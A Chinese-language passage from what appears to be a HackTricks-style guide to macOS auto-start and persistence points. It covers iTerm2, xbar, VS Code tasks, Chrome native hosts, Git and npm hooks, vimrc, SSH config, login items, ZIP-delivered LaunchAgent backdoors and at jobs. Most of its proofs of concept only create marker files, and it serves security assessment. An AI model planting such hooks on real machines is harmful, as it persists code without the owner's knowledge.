[当前的 iTerm2 Python API 指南](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts)介绍了在 `~/Library/Application Support/iTerm2/Scripts/AutoLaunch` 中自动运行 **Python** 脚本。该指南并未说明该文件夹中的任意可执行 `.sh` 文件都会运行。对于一次性使用的账户，将以下内容保存为 `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`：

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

[ current iTerm2 AppleScript guide](https://iterm2.com/documentation-scripting.html) 另行说明了 `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`；如果现代目录不存在，则会回退到旧版 `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt`。仅包含标记的 AppleScript 如下：

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

这些脚本示例已根据 iTerm2 文档核对，但未在活动桌面会话中运行。在一次性账户中测试后，请分别删除测试脚本以及 `/tmp/ht-iterm-autolaunch-marker` 或 `/tmp/iterm2-autolaunchscpt`。

位于 **`~/Library/Preferences/com.googlecode.iterm2.plist`** 的 iTerm2 偏好设置可以指定 profile command 或初始文本。后者会输入到会话中；是否执行取决于 shell 是否对其进行解释。[iTerm2 的 profile 文档](https://iterm2.com/documentation-preferences-profiles-general.html)介绍了使用该 profile 创建新会话时运行的命令。

此设置可在 iTerm2 设置中配置：

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

该命令也会反映在偏好设置中：

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

为进行安全评估，请在 iTerm2 设置中检查所选配置文件，或读取其偏好设置文件的副本。更改正在使用的配置文件中的 `Initial Text` 会影响用户的会话，因此研究用 Mac 上没有更改任何偏好设置。

### xbar

技术分析：[https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 但必须安装 xbar
- TCC bypass：[✅](https://emojipedia.org/check-mark-button)
  - 它会请求 Accessibility 权限

#### 位置

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **触发条件**：启动 xbar 时

#### 说明

如果已安装热门程序 [**xbar**](https://github.com/matryer/xbar)，则可以在 **`~/Library/Application\ Support/xbar/plugins/`** 中编写 shell 脚本，该脚本会在启动 xbar 时执行：<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- 可用于 bypass 沙盒: [✅](https://emojipedia.org/check-mark-button)
  - 但必须安装 Hammerspoon
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - 它会请求辅助功能权限

#### 位置

- **`~/.hammerspoon/init.lua`**
  - **触发条件**：Hammerspoon 执行后

#### 描述

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) 是一个 **macOS** 自动化平台，使用 **LUA 脚本语言**运行。值得注意的是，它支持集成完整的 AppleScript 代码以及执行 shell 脚本，显著增强了其脚本功能。<sup>[[13]](#references)</sup>

该应用会查找单个文件 `~/.hammerspoon/init.lua`，启动时执行其中的脚本。

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 但必须安装 BetterTouchTool
- TCC bypass：[✅](https://emojipedia.org/check-mark-button)
  - 它会请求 Automation-Shortcuts 和 Accessibility 权限

#### 位置

- 已启用的 BetterTouchTool preset **已引用**的脚本文件，或该 preset 在 `~/Library/Application Support/BetterTouchTool/` 下的配置。具体脚本路径取决于 preset 的配置方式。

[BetterTouchTool 的 action 参考文档](https://docs.folivora.ai/docs/actions/action-definitions/)介绍了 shell-script 和 background-command actions。相关 preset 处于激活状态时，必须触发已配置的键盘、鼠标、触控、widget 或其他事件；[其 trigger 指南](https://docs.folivora.ai/docs/configuration/new-trigger/)展示了这种配对关系。应用程序支持目录中的随机文件并不是 trigger。已配置、会加载外部可写脚本的 action，是范围更窄的写入到执行目标。代码以 BetterTouchTool 用户的账户运行，并受其实际 macOS 授权限制。研究用 Mac 的 `/Applications` 中没有 BetterTouchTool，因此未在本地更改或执行任何 preset。

### Alfred

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 但必须安装 Alfred
- TCC bypass：[✅](https://emojipedia.org/check-mark-button)
  - 它会请求 Automation、Accessibility，甚至 Full-Disk access 权限

#### 位置

- 已安装的 Alfred workflow **已引用**的脚本或文件，或该 workflow 在用户配置的 `Alfred.alfredpreferences` 目录中的内容。偏好设置目录可能会同步，并非固定的通用路径。

[Alfred 的 workflow 指南](https://www.alfredapp.com/help/workflows/)介绍了 Powerpack 的前置要求，以及通过其 UI 安装 workflow 的方式。已安装 workflow 的 hotkey、keyword 或其他已配置的 trigger 必须触发；[Alfred 的 hotkey 示例](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/)展示了 script action。[Alfred 的环境变量参考文档](https://www.alfredapp.com/help/workflows/script-environment-variables/)说明，可通过 `alfred_preferences` 获取所选的偏好设置路径。将未注册的 workflow 文件放入任意目录，并不能证明它会被安装或运行。代码以已登录的 Alfred 用户身份运行，并受其实际 macOS 授权限制。研究用 Mac 的 `/Applications` 中没有 Alfred，因此这里只依据文档评估此路径。

### Raycast Script Commands 和 extension 刷新

- **写入目标：**位于已通过 Raycast Settings → Script Commands 添加的目录中的可执行脚本。Raycast 不会扫描任意新建的目录。[Raycast 的 Script Commands 指南](https://manual.raycast.com/script-commands)介绍了目录注册方式。
- **触发方式和身份：**用户调用已索引的 command、已配置的 hotkey 或 fallback 调用该 command，或者 Raycast 按配置的 `@raycast.refreshTime` 刷新 `inline` script。脚本通过其 interpreter 以已登录的 Raycast 用户身份运行。[上游 metadata 参考文档](https://github.com/raycast/script-commands#metadata)规定，自动刷新仅适用于 inline commands；[Raycast 的 extension manifest](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md)则单独支持为已安装的 `no-view` 或 `menu-bar` extension commands 配置 `interval`。仅添加普通 script command 并不会为其安排定时执行。

对于已注册脚本目录的临时账户，marker-only inline script 如下：

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

将其保存到已注册的目录中，设为可执行文件，并让 Raycast 刷新。然后删除该文件和 `/tmp/ht-raycast-refresh-marker`。研究用 Mac 上的 Raycast 不在其通常的 `/Applications` 路径下，因此此内容有文档依据，但未在本地运行。辅助功能、自动化和文件授权仍受 macOS 权限提示控制。

### Visual Studio Code 自动工作区任务

- **写入目标：** 用户将打开的工作区中的 `.vscode/tasks.json`。
- **触发条件：** 在 VS Code 中打开该工作区，但只有在文件夹受信任**且**已允许自动任务时才会触发。不受信任的工作区不会运行自动任务；默认设置会在首次自动运行前提示用户。[VS Code 任务文档](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) 和 [工作区信任文档](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) 说明了这两个条件。
- **执行身份：** VS Code 用户的账户，通过配置的任务进程执行。这是应用程序专属的执行方式，不属于登录持久化。

在**新建的临时工作区**中，将以下仅用于写入标记的任务放入 `.vscode/tasks.json`：

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

打开受信任的工作区并允许自动任务运行后，检查是否存在 `.autostart-task-ran`。移除任务条目和标记以完成清理。**此行为已根据 Microsoft 文档和已安装的 VS Code 1.139.1 bundle 进行验证；未在活动桌面会话中运行。**

### Chrome 原生消息主机

- **写入目标：**当前用户的 `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json`，或所有用户的 `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json`（需要管理员写入权限）。Chromium 和 Chrome for Testing 使用不同目录；请参阅 [Chrome 当前的路径表](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location)。
- **触发方式：**已安装且具有 `nativeMessaging` 权限的 Chrome 扩展程序，使用清单中的确切主机名称调用 `chrome.runtime.connectNative()` 或 `chrome.runtime.sendNativeMessage()`。随后，Chrome 会启动主机可执行文件。仅打开 Chrome 不会执行任意新建的原生主机；如果没有调用它的扩展程序，仅创建清单不会产生任何效果。[Chrome 原生消息指南](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging)介绍了这一握手过程。
- **执行身份：**Chrome 用户的账户。清单必须指定可执行文件的绝对路径，并明确允许调用方扩展程序的来源。

在一次性浏览器账户中使用测试扩展程序时，以下这对文件展示了从写入到执行的关联。清单的文件名必须与其 `name` 相符，并且必须将 `TEST_EXTENSION_ID` 替换为该扩展程序的实际 ID：

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

将此 JSON 保存为 `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`。manifest 中 `path` 指向的仅用于标记的可执行文件可以包含：

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

在测试扩展的 service worker 或扩展页面中调用 `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` 后，标记文件可证明宿主已启动。这个最小化宿主未实现 Chrome 的长度前缀响应协议，因此写入标记文件后，扩展可能会报告消息传递错误。删除测试 manifest、宿主和标记文件以完成清理。在 macOS 26.5.2 上，Chrome 应用和两个 manifest 目录均存在；**未修改或使用活动的 Chrome 配置文件**。

### Karabiner-Elements 按键事件命令

- **写入目标：**在已安装并运行 Karabiner-Elements 的账户中，写入 `~/.config/karabiner/karabiner.json`。[Karabiner 的文件位置指南](https://karabiner-elements.pqrs.org/docs/json/location/)指出，应用会监视此文件，并在写入后重新加载。`assets/complex_modifications` 中的 JSON 文件仅为可导入的预设；仅将文件写入该目录并不会启用规则。
- **触发条件：**规则启用后，触发所配置的按键事件。[`to.shell_command` 参考文档](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/)介绍了命令执行。这不会在登录时或每次文件写入时执行代码。
- **执行身份：**运行 Karabiner 用户进程的已登录用户。该进程自身获得的权限以及任何 TCC 访问权限取决于应用和版本。

在一次性测试账户中，将此规则对象添加到 `karabiner.json` 中所选配置文件的 `complex_modifications.rules` 数组，并保留该配置文件的其余内容。按 F18 创建一个无害的标记文件，然后删除此规则和标记文件。选择 F18 可避免替换常用的打字按键：

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements 未安装在 macOS 26.5.2 测试机器的 `/Applications` 中，因此这是一个有文档依据的 PoC，而非本地运行结果。

### 本地仓库中的 Git hooks

- **写入目标：** 可执行 hook，例如 `<repo>/.git/hooks/post-checkout`。如果已设置 `core.hooksPath`，则使用该配置目录。作为普通跟踪源文件提交的 hook 不会自动安装到克隆仓库中。
- **触发条件：** 对应的 Git 操作。例如，`post-checkout` 会在 `git checkout` 或 `git switch` 后运行，也可能在克隆或创建 worktree 后运行。[Git's hook reference](https://git-scm.com/docs/githooks) 列出了相关事件及可执行位要求；[`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) 会更改查找目录。
- **执行身份：** 运行 Git 的账户。只有当仓库实际使用的 hooks 目录可由该操作者写入，且用户之后执行相关 Git 操作时，hook 才能运行。

这个仅写入标记的 PoC 会创建一个完全可丢弃的仓库、安装一个 hook，然后切换分支。该 PoC 已在 macOS 26.5.2 上使用 Apple Git 2.50.1 成功运行：

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### 项目中的 npm 生命周期脚本

- **写入目标：** 可写项目的 `package.json` 中的 `scripts` 映射，或用户将运行其生命周期脚本的已安装依赖包。这是开发工作流钩子，不会因打开目录而执行。
- **触发条件和身份：** 后续执行 `npm install` 或 `npm ci` 且允许生命周期脚本时，会以调用 npm 的用户身份运行 `preinstall`、`install` 和 `postinstall`。普通的 `npm run <name>` 也会运行匹配的 `pre<name>` 和 `post<name>` 脚本。[npm 的生命周期参考](https://docs.npmjs.com/cli/v11/using-npm/scripts)列出了相关事件；[`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) 可禁止安装生命周期脚本。版本和策略设置可能会改变允许执行的内容，因此请检查目标 npm 版本。

这个仅写入标记的 PoC 使用本地 npm 在一个临时的空目录中运行。它不会下载依赖项，也不会更改用户的项目：

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

这与 Python 解释器启动文件不同：npm 必须执行相关的 install 或 run 操作，而 Python `site` 代码可在普通的解释器调用中加载。通用的 `Makefile` 目标和构建任务定义同样需要用户或已配置的工具调用相应目标；它们不是独立的 OS 自动启动路径。

### Vim 启动配置

- **写入目标：** 将 `~/.vimrc` 写入将启动 Vim 的用户主目录（或写入 Vim 初始化顺序中选定的其他启动文件）。[Vim's startup reference](https://vimhelp.org/starting.txt.html) 介绍了该文件以及 `VIMINIT`/`EXINIT` 覆盖项。
- **触发条件：** 后续普通启动 Vim 时会加载此配置。Vim 的 `-u NONE` 选项会跳过用户 vimrc。这是编辑器特定的执行，不是 OS 登录触发机制。
- **执行身份：** Vim 用户的账户。

以下隔离 PoC 在 macOS 的 `/usr/bin/vim` 上运行；它不会写入真实的 Vim 首选项或打开的文档：

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim 有单独的用户配置路径 `$XDG_CONFIG_HOME/nvim/init.lua` 或 `init.vim`，并且会根据其[启动文档](https://neovim.io/doc/user/starting/)加载 `plugin/` 运行时目录中的脚本。macOS 26.5.2 测试机器上未安装 Neovim，因此未在那里运行此变体。

### SSH 客户端配置命令

- **写入目标：** `~/.ssh/config`，或该文件已包含的其他文件。这是**客户端**配置文件，与下文介绍的服务器端 `~/.ssh/rc` 相互独立。
- **触发条件：** 匹配的 `ssh` 调用。客户端评估配置时，`Match exec` 会运行本地命令，即使使用只打印配置而不建立连接的 `ssh -G` 也会运行。客户端建立匹配连接时会运行 `ProxyCommand`。只有在连接成功后才会运行 `LocalCommand`，并且需要设置 `PermitLocalCommand yes`（默认值为 `no`）。这些命令的运行时机和前提各不相同；仅写入配置不会触发它们。参见上游 [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5)。
- **执行身份：** 运行 `ssh` 的本地用户。必须存在匹配的主机和适用的配置文件，并满足所需的连接条件。`ssh -F` 可以指定其他配置文件。

此 marker-only PoC 使用 macOS 26.5.2 上 Apple 的 SSH 客户端运行。`-G` 会触发 `Match exec`，而不会建立网络连接或读取用户实际的 SSH 配置：

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### 调试器初始化文件

- **写入目标：** `~/.lldbinit`，或优先级更高的应用专用文件，例如 `~/.lldbinit-lldb`。LLDB 会在调试器启动时读取其中一个文件。默认情况下，不会执行当前目录中的 `.lldbinit`；用户必须启用 `target.load-cwd-lldbinit` 或传入 `--local-lldbinit`。参见 [LLDB 手册](https://lldb.llvm.org/man/lldb.html)。
- **触发条件和身份：** 用户启动 LLDB 时未使用 `--no-lldbinit`；命令以该用户身份运行。仅仅打开项目并不意味着项目的 `.lldbinit` 会运行。

以下仅含标记的测试是在 macOS 26.5.2 上对 LLDB 执行的，使用了隔离的 home 目录和工作目录：

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

对于 **GDB**，[上游启动文档](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html)列出了 macOS 上的 `$HOME/Library/Preferences/gdb/gdbinit`，然后是 `~/.gdbinit`。当前目录中的 `.gdbinit` 受 [auto-load safe path](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html) 限制，而 `-nx`/`-nh` 会禁止加载初始化文件。测试用的 Mac 未安装 GDB，因此未在本地运行此变体。

### SSHRC

说明：[https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 但必须启用并使用 ssh
- TCC bypass：[✅](https://emojipedia.org/check-mark-button)
  - 使用 SSH 以获得 FDA 访问权限

#### 位置

- **`~/.ssh/rc`**
  - **触发条件**：通过 ssh 登录
- **`/etc/ssh/sshrc`**
  - 需要 root 权限
  - **触发条件**：通过 ssh 登录

> [!CAUTION]
> 开启 ssh 需要 Full Disk Access：
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### 描述与利用

默认情况下，除非在 `/etc/ssh/sshd_config` 中设置 `PermitUserRC no`，否则用户**通过 SSH 登录**时，会执行脚本 **`/etc/ssh/sshrc`** 和 **`~/.ssh/rc`**。<sup>[[14]](#references)</sup>

### **登录项**

文章：[https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 但你需要带参数执行 `osascript`
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- **已注册的登录项 helper app：** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app`（常见的捆绑位置）。
  - **触发条件：** 注册时可能会立即启动 helper；之后用户每次登录时也会启动，但需经过批准。
- **已注册的捆绑 agent/daemon：** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` 或 `Contents/Library/LaunchDaemons/<name>.plist`。
  - **触发条件：** 获准的 agent 可能在注册时启动，并在之后的登录时启动；获准的 daemon 会在启动时运行。daemon 需要管理员批准。

#### 描述

用户可在 **System Settings → General → Login Items & Extensions** 中查看登录项和后台项。macOS 13 及更高版本提供 [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice)，用于注册捆绑的登录项、launch agents 和 launch daemons。其 [`register()` 行为](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29)会因类型和批准状态而异。**仅将 helper 写入 app bundle 并不足以注册新的登录项。**反过来，如果已注册的 helper 可执行文件可写，修改该可执行文件可能会影响其下次启动，无需重新注册；请先核实实际路径和代码签名检查。

以下是在 Mac 上查找捆绑 helper 的只读方法；它不会注册或启动其中任何一个：

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

对于 bundled launch plist，应将 `BundleProgram` **相对于 app bundle 根目录**解析（例如 `Contents/MacOS/Helper`），这正如 [Apple 的 Service Management 迁移指南](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos) 所述。在研究用 Mac 上对 `/Applications` 进行只读清点，发现了 14 个 bundled helper 条目和五个 `BundleProgram` 声明；五个目标均成功解析，其中两个通过了用户可写性检查。该检查**并不能**证明这两个 helper 中的任一个已注册、已启用、通过签名验证后可执行，或可被 sandbox 访问。`sfltool dumpbtm` 在这台 Mac 上列出了 150 条命名记录；它是检查辅助工具，并不能证明每条记录都在运行。

较早期的 login items 也可以通过 Apple events 管理。可以从命令行列出、添加和移除它们，但添加操作会更改用户持久化的登录配置，并且可能需要 Automation 授权：<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` 是实现细节，不是受支持的安装 payload 的位置，不能仅通过写入文件来安装。对于新的 helper，旧版 `SMLoginItemSetEnabled` API 已被 `SMAppService` 取代；在 macOS 26.5.2 测试机器上，页面先前提到的 `/var/db/com.apple.xpc.launchd/loginitems.501.plist` 路径并不存在。评估现代登录项时，应查看注册 API 和系统 UI 状态，而不是假定某个数据库路径存在。

### ZIP as Login Item

（请查看上一节关于 Login Items 的内容；本节是其扩展）

如果将 **ZIP** 文件设为 **Login Item**，**`Archive Utility`** 会打开它。如果该 ZIP 例如存放在 **`~/Library`** 中，并包含带有后门的文件夹 **`LaunchAgents/file.plist`**，系统就会创建该文件夹（默认情况下它并不存在），并将 plist 添加进去。这样，用户下次登录时，**plist 中指定的 backdoor 就会执行**。

另一种做法是在用户 HOME 目录中创建 **`.bash_profile`** 和 **`.zshenv`** 文件，这样即使 LaunchAgents 文件夹已经存在，这种技术仍然有效。

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
  - 但你需要**执行** **`at`**，而且它必须处于**启用**状态
- TCC 绕过：[🔴](https://emojipedia.org/large-red-circle)

#### Location

- 需要**执行** **`at`**，而且它必须处于**启用**状态

#### **Description**

`at` 任务用于**安排一次性任务**在指定时间执行。与 cron jobs 不同，`at` 任务会在执行后自动删除。需要注意的是，这些任务在系统重启后仍会保留，因此在某些情况下可能构成安全隐患。<sup>[[16]](#references)</sup>

捆绑的 `com.apple.atrun.plist` 设置了 `Disabled = true`，但 launchd 会单独保存实际生效的启用/禁用覆盖设置。在 macOS 26.5.2 测试机器上，`launchctl print-disabled system` 显示 `com.apple.atrun` 处于**启用**状态，尽管捆绑配置中存在该键。声称 `at` jobs 会运行之前，请先检查实际生效状态：

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

管理员可以使用 `launchctl` 启用已停用的 `atrun` 服务；以下历史示例会更改系统服务状态，且**未**在研究用 Mac 上运行：

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

这将在 1 小时后创建一个文件：

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

使用 `atq` 检查作业队列：

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

上面可以看到两个已安排的任务。我们可以使用 `at -c JOBNUMBER` 打印任务的详细信息。

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> 如果未启用 AT tasks，创建的任务将不会执行。

**作业文件**位于 `/private/var/at/jobs/`。

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

文件名包含队列、作业编号以及计划运行的时间。例如，来看一下 `a0001a019bdcd2`。

- `a` - 队列
- `0001a` - 十六进制作业编号，`0x1a = 26`
- `019bdcd2` - 十六进制时间，表示自 epoch 起经过的分钟数。`0x019bdcd2` 转换为十进制是 `26991826`。乘以 60 后得到 `1619509560`，即 `GMT: 2021. April 27., Tuesday 7:46:00`。

打印作业文件后，我们发现其中包含的信息与使用 `at -c` 得到的信息相同。

### Calendar 打开文件提醒

- **写入目标：** 可执行 app bundle，或已由 Calendar 事件的自定义 **打开文件**提醒选定的其他文件。创建或编辑提醒本身，需要通过 Calendar 或获准的日历数据源访问该日历事件；随意写入某个文件并不会创建提醒。
- **触发条件：** 在 Calendar 处理该事件的 Mac 上，到达提醒的计划时间。重复事件可以重复执行此操作。[Apple 当前的 Calendar 指南](https://support.apple.com/guide/calendar/icl1012/mac)确认，macOS 26 提供 **自定义 → 打开文件**提醒选项。
- **执行身份与限制：** Calendar 会通过关联的应用，为已登录用户打开所选文件。启动 app bundle 可能会以该用户身份执行其中的代码，但受 Gatekeeper、quarantine 和其他 macOS 检查限制。普通脚本文件可能只会在编辑器中打开；仅凭文件扩展名无法证明代码会执行。

要安全评估候选文件，请在 Calendar 中检查事件的提醒，以及所选文件的权限。此路径依据 Apple 指南记录，**未在研究用 Mac 上测试**，因为测试会修改正在使用的日历，并需要等待桌面事件触发。可以在一次性账户中选择一个仅用于写入标记的 app bundle，设置即将触发的“打开文件”提醒，确认应用启动，然后删除该事件和 app。

### macOS 上的 Shortcuts 自动化

- **写入目标：** 已由快捷指令操作引用的可执行文件，或获授权用户可以编辑的现有快捷指令。随意创建 `.shortcut` 文件，或向未公开的 Shortcuts 数据库写入内容，都不是受支持的自动化注册方式。
- **触发条件与身份：** 预先配置并启用的自动化事件（例如特定时间或 app 事件）会以已登录用户的身份调用快捷指令。[Apple 当前的 Mac 自动化指南](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac)列出了支持的事件，说明哪些自动化可以在不询问的情况下运行，并介绍如何移除触发条件。[Apple 的 Shortcuts 隐私指南](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac)要求脚本操作启用 **允许运行脚本**，且个别操作仍可能请求权限。

这是一条有条件的写入到执行路径，**仅当现有操作会加载一个可写目标时才成立**。通过 UI 创建新的自动化会更改正在使用的设置，因此未在研究用 Mac 上尝试。在一次性账户中，所有者可以配置一个在特定时间运行、会触碰 `/tmp/ht-shortcuts-marker` 的快捷指令，启用必要权限，在事件触发后确认标记，然后删除自动化、快捷指令和标记。

### Automator 操作与 Quick Actions

- **写入目标：** 动作 bundle 可位于 `~/Library/Automator/*.action`（用户级）和 `/Library/Automator/*.action`（管理员级）。已保存的 Quick Action 工作流程通常位于 `~/Library/Services/*.workflow`；请检查用户实际选择的工作流程路径。[Apple 的 Automator 框架参考](https://developer.apple.com/documentation/automator)列出了动作的搜索目录。
- **触发条件：** Automator 运行时会加载可用的动作 bundle，但只有在使用该动作的工作流程执行时，动作任务才会运行。用户从 Finder、Services 或其他显示的菜单中选择 Quick Action 时，它才会运行。Folder Action 工作流程会在项目被添加到其**已关联**文件夹时运行，Calendar Alarm 工作流程则会在事件时间运行。[Apple 的工作流程类型说明](https://support.apple.com/guide/automator/aut7cac58839/mac)区分了这些事件。仅写入动作或工作流程，并不会关联文件夹或安排日历事件。
- **执行身份与限制：** 运行工作流程的账户；Automator 或调用它的 app 必须能够加载该动作，且当前代码签名检查和隐私检查必须允许执行。已被活动工作流程引用的可写动作 bundle，与安装新动作后等待用户选择，是两种不同情况。

